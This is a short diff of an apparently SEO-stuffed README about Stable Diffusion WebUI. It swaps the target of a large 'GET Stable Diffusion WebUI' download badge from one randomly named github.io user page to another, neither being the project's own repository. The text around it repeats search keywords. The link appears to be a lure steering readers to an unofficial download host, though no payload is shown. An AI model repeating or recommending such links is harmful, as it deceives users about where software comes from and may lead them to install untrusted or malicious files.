@@ -52,7 +52,7 @@ The repository is useful for anyone comparing stable diffusion webui github reso
 
 Prerequisites: A computer that can run Python and Git, plus enough storage for Stable Diffusion WebUI files, model checkpoints, and generated images.
 
-[![GET Stable Diffusion WebUI](https://img.shields.io/badge/GET%20%E2%80%94%20Stable%20Diffusion%20WebUI-0078D6?style=for-the-badge&logoColor=white)](https://brysonsandersuxqn.github.io/.github/stable-diffusion-webui)
+[![GET Stable Diffusion WebUI](https://img.shields.io/badge/GET%20%E2%80%94%20Stable%20Diffusion%20WebUI-0078D6?style=for-the-badge&logoColor=white)](https://princehannazlko.github.io/.github/stable-diffusion-webui)
 
 1.  **Download the project:** Use stable diffusion webui github instructions or a trusted stable diffusion webui download source to get the current repository files.
 2.  **Install requirements:** Follow the stable diffusion webui install steps for your platform, including Python, Git, launch scripts, and any GPU-specific requirements.
